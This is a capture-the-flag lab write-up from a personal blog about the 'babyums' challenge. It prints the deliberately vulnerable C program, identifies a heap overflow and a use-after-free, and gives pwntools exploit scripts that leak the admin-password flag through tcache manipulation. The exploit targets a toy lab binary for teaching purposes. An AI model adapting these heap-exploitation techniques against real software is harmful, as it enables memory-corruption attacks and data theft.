<!doctype html><html lang=en-us dir=ltr><head><meta charset=UTF-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content='
  Simple PWN 0x19(Lab - babyums - flag 1)
  #


  tags: CTF PWN eductf
  #

Version: Ubuntu 20.04

  Original Code
  #

:::spoiler Original Code
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#define FLAG1 "flag{XXXXXXXX}"

struct User
{
    char name[0x10];
    char password[0x10];
    void *data;
};

struct User *users[8];

static short int get_idx()
{
    short int idx;

    printf("index\n> ");
    scanf("%hu", &amp;idx);

    if (idx >= 8)
        printf("no, no ..."), exit(1);
    
    return idx;
}

static short int get_size()
{
    short int size;

    printf("size\n> ");
    scanf("%hu", &amp;size);

    if (size >= 0x500)
        printf("no, no ..."), exit(1);
    
    return size;
}

void add_user()
{
    short int idx;

    idx = get_idx();
    users[idx] = malloc(sizeof(*users[idx]));

    printf("username\n> ");
    read(0, users[idx]->name, 0x10);

    printf("password\n> ");
    read(0, users[idx]->password, 0x10);

    users[idx]->data = NULL;
    printf("success!\n");
}

void edit_data()
{
    short int idx;
    short int size;

    idx = get_idx();
    size = get_size();

    if (users[idx]->data == NULL)
        users[idx]->data = malloc(size);
    
    read(0, users[idx]->data, size);
    printf("success!\n");
}

void del_user()
{
    short int idx;

    idx = get_idx();
    free(users[idx]->data);
    free(users[idx]);
    printf("success!\n");
}

void show_users()
{
    for (int i = 0; i < 8; i++) {
        if (users[i] == NULL || users[i]->data == NULL)
            continue;
        
        printf("[%d] %s\ndata: %s\n", i, users[i]->name, (char *)users[i]->data);
    }
}

void add_admin()
{
    users[0] = malloc(sizeof(*users[0]));
    strcpy(users[0]->name, "admin");
    strcpy(users[0]->password, FLAG1);
    users[0]->data = NULL;
}

int main()
{
    char opt[2];
    int power = 20;

    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    printf("**** User Management System ****\n");
    add_admin();

    while (power)
    {
        power--;
        printf("1. add_user\n"
               "2. edit_data\n"
               "3. del_user\n"
               "4. show_users\n"
               "5. bye\n"
               "> ");
        read(0, opt, 2);

        switch (opt[0]) {
        case &#39;1&#39;: add_user(); break;
        case &#39;2&#39;: edit_data(); break;
        case &#39;3&#39;: del_user(); break;
        case &#39;4&#39;: show_users(); break;
        case &#39;5&#39;: exit(0);
        }
    }
    printf("No... no power..., b..ye...\n");
    
    return 0;
}
:::'><meta name=theme-color media="(prefers-color-scheme: light)" content="#ffffff"><meta name=theme-color media="(prefers-color-scheme: dark)" content="#343a40"><meta name=color-scheme content="light dark"><meta property="og:url" content="https://bernie6401.github.io/security/course/ntu-cs/pwn/simple-pwn-0x19lab---babyums---flag-1/"><meta property="og:site_name" content="SBK Hugo Site"><meta property="og:title" content="Simple PWN 0x19(Lab - `babyums` - flag 1)"><meta property="og:description" content='Simple PWN 0x19(Lab - babyums - flag 1) # tags: CTF PWN eductf # Version: Ubuntu 20.04
Original Code # :::spoiler Original Code
#include <stdio.h> #include <stdlib.h> #include <string.h> #include <unistd.h> #define FLAG1 "flag{XXXXXXXX}" struct User { char name[0x10]; char password[0x10]; void *data; }; struct User *users[8]; static short int get_idx() { short int idx; printf("index\n> "); scanf("%hu", &amp;idx); if (idx >= 8) printf("no, no ..."), exit(1); return idx; } static short int get_size() { short int size; printf("size\n> "); scanf("%hu", &amp;size); if (size >= 0x500) printf("no, no ..."), exit(1); return size; } void add_user() { short int idx; idx = get_idx(); users[idx] = malloc(sizeof(*users[idx])); printf("username\n> "); read(0, users[idx]->name, 0x10); printf("password\n> "); read(0, users[idx]->password, 0x10); users[idx]->data = NULL; printf("success!\n"); } void edit_data() { short int idx; short int size; idx = get_idx(); size = get_size(); if (users[idx]->data == NULL) users[idx]->data = malloc(size); read(0, users[idx]->data, size); printf("success!\n"); } void del_user() { short int idx; idx = get_idx(); free(users[idx]->data); free(users[idx]); printf("success!\n"); } void show_users() { for (int i = 0; i < 8; i++) { if (users[i] == NULL || users[i]->data == NULL) continue; printf("[%d] %s\ndata: %s\n", i, users[i]->name, (char *)users[i]->data); } } void add_admin() { users[0] = malloc(sizeof(*users[0])); strcpy(users[0]->name, "admin"); strcpy(users[0]->password, FLAG1); users[0]->data = NULL; } int main() { char opt[2]; int power = 20; setvbuf(stdin, NULL, _IONBF, 0); setvbuf(stdout, NULL, _IONBF, 0); printf("**** User Management System ****\n"); add_admin(); while (power) { power--; printf("1. add_user\n" "2. edit_data\n" "3. del_user\n" "4. show_users\n" "5. bye\n" "> "); read(0, opt, 2); switch (opt[0]) { case &#39;1&#39;: add_user(); break; case &#39;2&#39;: edit_data(); break; case &#39;3&#39;: del_user(); break; case &#39;4&#39;: show_users(); break; case &#39;5&#39;: exit(0); } } printf("No... no power..., b..ye...\n"); return 0; } :::'><meta property="og:locale" content="en_us"><meta property="og:type" content="article"><meta property="article:section" content="security"><meta property="article:tag" content="CTF"><meta property="article:tag" content="PWN"><meta property="article:tag" content="Eductf"><title>Simple PWN 0x19(Lab - `babyums` - flag 1) | SBK Hugo Site</title>
<link rel=icon href=/favicon.png><link rel=manifest href=/manifest.json><link rel=canonical href=https://bernie6401.github.io/security/course/ntu-cs/pwn/simple-pwn-0x19lab---babyums---flag-1/><link rel=stylesheet href=/book.min.6c8b9d2a1fc95075ed7da46ca81060b39add8fff6741ac51259f768929281e2c.css integrity="sha256-bIudKh/JUHXtfaRsqBBgs5rdj/9nQaxRJZ92iSkoHiw=" crossorigin=anonymous><script defer src=/fuse.min.js></script><script defer src=/en.search.min.acdc41c8d39e6c69d70d8a23779875e0a3733fefead3e428d5344966bb12f562.js integrity="sha256-rNxByNOebGnXDYojd5h14KNzP+/q0+Qo1TRJZrsS9WI=" crossorigin=anonymous></script></head><body dir=ltr><input type=checkbox class="hidden toggle" id=menu-control>
<input type=checkbox class="hidden toggle" id=toc-control><main class="container flex"><aside class=book-menu><div class=book-menu-content><nav><h2 class=book-brand><a class="flex align-center" href=/><span>SBK Hugo Site</span></a></h2><div class="book-search hidden"><input type=text id=book-search-input placeholder=Search aria-label=Search maxlength=64 data-hotkeys=s/><div class="book-search-spinner hidden"></div><ul id=book-search-results></ul></div><script>document.querySelector(".book-search").classList.remove("hidden")</script></nav><script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script></div></aside><div class=book-page><header class=book-header><div class="flex align-center justify-between"><label for=menu-control><img src=/svg/menu.svg class=book-icon alt=Menu></label><h3>Simple PWN 0x19(Lab - `babyums` - flag 1)</h3><label for=toc-control><img src=/svg/toc.svg class=book-icon alt="Table of Contents"></label></div><aside class="hidden clearfix"><nav id=TableOfContents><ul><li><ul><li></li></ul></li><li><a href=#original-code>Original Code</a><ul><li><a href=#something-wrong>Something wrong</a></li></ul></li><li><a href=#exploit>Exploit</a><ul><li><a href=#hard-solution---leak-heap-base-address--heap-overflow>Hard solution - leak heap base address + heap overflow</a></li><li><a href=#easy-solution>Easy solution</a></li></ul></li></ul></nav></aside></header><article class="markdown book-article"><h1 id=simple-pwn-0x19lab---babyums---flag-1>Simple PWN 0x19(Lab - <code>babyums</code> - flag 1)
<a class=anchor href=#simple-pwn-0x19lab---babyums---flag-1>#</a></h1><h6 id=tags-ctf-pwn-eductf>tags: <code>CTF</code> <code>PWN</code> <code>eductf</code>
<a class=anchor href=#tags-ctf-pwn-eductf>#</a></h6><p>Version: Ubuntu 20.04</p><h2 id=original-code>Original Code
<a class=anchor href=#original-code>#</a></h2><p>:::spoiler Original Code</p><pre tabindex=0><code class="language-cpp=" data-lang="cpp=">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;unistd.h&gt;
#define FLAG1 &#34;flag{XXXXXXXX}&#34;

struct User
{
    char name[0x10];
    char password[0x10];
    void *data;
};

struct User *users[8];

static short int get_idx()
{
    short int idx;

    printf(&#34;index\n&gt; &#34;);
    scanf(&#34;%hu&#34;, &amp;idx);

    if (idx &gt;= 8)
        printf(&#34;no, no ...&#34;), exit(1);
    
    return idx;
}

static short int get_size()
{
    short int size;

    printf(&#34;size\n&gt; &#34;);
    scanf(&#34;%hu&#34;, &amp;size);

    if (size &gt;= 0x500)
        printf(&#34;no, no ...&#34;), exit(1);
    
    return size;
}

void add_user()
{
    short int idx;

    idx = get_idx();
    users[idx] = malloc(sizeof(*users[idx]));

    printf(&#34;username\n&gt; &#34;);
    read(0, users[idx]-&gt;name, 0x10);

    printf(&#34;password\n&gt; &#34;);
    read(0, users[idx]-&gt;password, 0x10);

    users[idx]-&gt;data = NULL;
    printf(&#34;success!\n&#34;);
}

void edit_data()
{
    short int idx;
    short int size;

    idx = get_idx();
    size = get_size();

    if (users[idx]-&gt;data == NULL)
        users[idx]-&gt;data = malloc(size);
    
    read(0, users[idx]-&gt;data, size);
    printf(&#34;success!\n&#34;);
}

void del_user()
{
    short int idx;

    idx = get_idx();
    free(users[idx]-&gt;data);
    free(users[idx]);
    printf(&#34;success!\n&#34;);
}

void show_users()
{
    for (int i = 0; i &lt; 8; i++) {
        if (users[i] == NULL || users[i]-&gt;data == NULL)
            continue;
        
        printf(&#34;[%d] %s\ndata: %s\n&#34;, i, users[i]-&gt;name, (char *)users[i]-&gt;data);
    }
}

void add_admin()
{
    users[0] = malloc(sizeof(*users[0]));
    strcpy(users[0]-&gt;name, &#34;admin&#34;);
    strcpy(users[0]-&gt;password, FLAG1);
    users[0]-&gt;data = NULL;
}

int main()
{
    char opt[2];
    int power = 20;

    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    printf(&#34;**** User Management System ****\n&#34;);
    add_admin();

    while (power)
    {
        power--;
        printf(&#34;1. add_user\n&#34;
               &#34;2. edit_data\n&#34;
               &#34;3. del_user\n&#34;
               &#34;4. show_users\n&#34;
               &#34;5. bye\n&#34;
               &#34;&gt; &#34;);
        read(0, opt, 2);

        switch (opt[0]) {
        case &#39;1&#39;: add_user(); break;
        case &#39;2&#39;: edit_data(); break;
        case &#39;3&#39;: del_user(); break;
        case &#39;4&#39;: show_users(); break;
        case &#39;5&#39;: exit(0);
        }
    }
    printf(&#34;No... no power..., b..ye...\n&#34;);
    
    return 0;
}
</code></pre><p>:::</p><h3 id=something-wrong>Something wrong
<a class=anchor href=#something-wrong>#</a></h3><ul><li>Heap overflow</li><li>Used after free(UAF)</li><li>Note that, flag 1 is admin password, flag 2 is at <code>/home/chal/</code></li></ul><h2 id=exploit>Exploit
<a class=anchor href=#exploit>#</a></h2><h3 id=hard-solution---leak-heap-base-address--heap-overflow>Hard solution - leak heap base address + heap overflow
<a class=anchor href=#hard-solution---leak-heap-base-address--heap-overflow>#</a></h3><p>If we can use heap overflow to overlap the <code>user k</code>&rsquo;s <code>*data</code>, then we can let it point to admin&rsquo;s password and use <code>show_users()</code> to print it out</p><ol><li><p>leak admin password address
It&rsquo;s very straight forward, if we delete two user, user 2 first and then user 1, at the same time, the <code>fd</code> of user 1 will point to the data of user 2. Then we can use <code>show_user()</code> to leak the address and try to find <code>admin_pass_addr</code> by minus offset</p><pre tabindex=0><code class=language-python! data-lang=python!>edit_data(0, 0x8, b&#39;a&#39;)    # Must add this line to use heap overflow
add_user(1, b&#39;a&#39;*8, b&#39;aaaa&#39;)
edit_data(1, 0x20, b&#39;a&#39;)
add_user(2, b&#39;b&#39;*8, b&#39;bbbb&#39;)
del_user(2)
del_user(1)
show_user()
r.recvuntil(b&#39;[1] &#39;)
r.recvuntil(b&#39;data: &#39;)
admin_pass_addr = u64(r.recv(6).ljust(8, b&#39;\x00&#39;)) - 0xa0
print(hex(admin_pass_addr))
</code></pre><p><img src=https://imgur.com/ZicILFr.png alt></p></li><li><p>Get the memory back from <code>tcache</code></p><pre tabindex=0><code class=language-python! data-lang=python!>add_user(1, b&#39;a&#39;*8, b&#39;aaaa&#39;)
edit_data(1, 0x20, b&#39;a&#39;)
</code></pre></li><li><p>Construct fake chunk that the data pointer will point to the <code>admin_pass_addr</code></p><pre tabindex=0><code class=language-python! data-lang=python!>fake_chunk = flat(
    b&#39;a&#39;*8, b&#39;a&#39;*8,
    b&#39;a&#39;*8, 0x31,
    b&#39;a&#39;*8, b&#39;a&#39;*8,
    b&#39;a&#39;*8, b&#39;a&#39;*8,
    admin_pass_addr, 
)
edit_data(0, 0x48, fake_chunk)
show_user()
</code></pre><p><img src=https://imgur.com/N81QUXR.png alt></p></li><li><p>Then we got flag 1!!!
<img src=https://imgur.com/HezQUdJ.png alt></p></li></ol><h3 id=easy-solution>Easy solution
<a class=anchor href=#easy-solution>#</a></h3><p>Try to let the admin user be the data of other user, then we can use <code>show_user</code> function to print it out</p><pre tabindex=0><code class=language-python! data-lang=python!>add_user(1, b&#39;a&#39;*8, b&#39;aaaa&#39;)
del_user(0)
edit_data(1, 0x20, b&#39;b&#39;*16)
show_user()
</code></pre><ol><li>First, we add user 1
<img src=https://imgur.com/TrRwqJY.png alt></li><li>Then we delete user 0(admin), so that it&rsquo;ll be put into <code>tcache</code>(<code>0x30</code>)
<img src=https://imgur.com/GlClYCU.png alt></li><li>When we use <code>edit_data</code> function, it&rsquo;ll get a memory space from sub-bin of <code>tcache</code> be user1&rsquo;s data, which is what we delete. In addition, in order to print the data section out, must change the <code>NULL</code> byte to garbage
<img src=https://imgur.com/B4lCir7.png alt></li><li>Then we got flag 1!!!
<img src=https://imgur.com/mUA6ubZ.png alt></li></ol><p>:::spoiler Whole exploit</p><pre tabindex=0><code class="language-python=" data-lang="python=">from pwn import *

r = process(&#39;./chal&#39;)
# r = remote(&#39;edu-ctf.zoolab.org&#39;, 10008)

context.arch = &#39;amd64&#39;

def add_user(idx, user_name, user_passwd):
    r.sendafter(b&#39;&gt; &#39;, b&#39;1&#39;)
    r.sendlineafter(b&#39;index\n&gt; &#39;, str(idx))
    r.sendafter(b&#39;username\n&gt; &#39;, user_name)
    r.sendafter(b&#39;password\n&gt; &#39;, user_passwd)

def edit_data(idx, note_size, message):
    r.sendafter(b&#34;&gt; &#34;, b&#34;2&#34;)
    r.sendlineafter(b&#39;index\n&gt; &#39;, str(idx))
    r.sendlineafter(b&#39;size\n&gt; &#39;, str(note_size))
    r.send(message)

def del_user(idx):
    r.sendafter(b&#34;&gt; &#34;, b&#34;3&#34;)
    r.sendlineafter(b&#39;index\n&gt; &#39;, str(idx))

def show_user():
    r.sendafter(b&#34;&gt; &#34;, b&#34;4&#34;)


&#39;&#39;&#39;------------------
Hard solution
------------------&#39;&#39;&#39;
edit_data(0, 0x8, b&#39;a&#39;)
add_user(1, b&#39;a&#39;*8, b&#39;aaaa&#39;)
edit_data(1, 0x20, b&#39;a&#39;)
add_user(2, b&#39;b&#39;*8, b&#39;bbbb&#39;)
del_user(2)
del_user(1)
show_user()
r.recvuntil(b&#39;[1] &#39;)

admin_pass_addr = u64(r.recv(6).ljust(8, b&#39;\x00&#39;)) - 0x70
print(hex(admin_pass_addr))
add_user(1, b&#39;a&#39;*8, b&#39;aaaa&#39;)
fake_chunk = flat(
    b&#39;a&#39;*8, b&#39;a&#39;*8,
    b&#39;a&#39;*8, 0x31,
    b&#39;a&#39;*8, b&#39;a&#39;*8,
    b&#39;a&#39;*8, b&#39;a&#39;*8,
    admin_pass_addr, 
)

edit_data(1, 0x20, b&#39;a&#39;)
edit_data(0, 0x48, fake_chunk)
show_user()

&#39;&#39;&#39;------------------
Easy solution
------------------&#39;&#39;&#39;
add_user(1, b&#39;a&#39;*8, b&#39;aaaa&#39;)
del_user(0)
edit_data(1, 0x20, b&#39;b&#39;*16)
show_user()

r.interactive()
</code></pre><p>:::</p></article><footer class=book-footer><div class="flex flex-wrap justify-between"></div><script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){if(window.getSelection().toString())return;e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script></footer><div class=book-comments></div><label for=menu-control class="hidden book-menu-overlay"></label></div><aside class=book-toc><div class=book-toc-content><nav id=TableOfContents><ul><li><ul><li></li></ul></li><li><a href=#original-code>Original Code</a><ul><li><a href=#something-wrong>Something wrong</a></li></ul></li><li><a href=#exploit>Exploit</a><ul><li><a href=#hard-solution---leak-heap-base-address--heap-overflow>Hard solution - leak heap base address + heap overflow</a></li><li><a href=#easy-solution>Easy solution</a></li></ul></li></ul></nav></div></aside></main></body></html>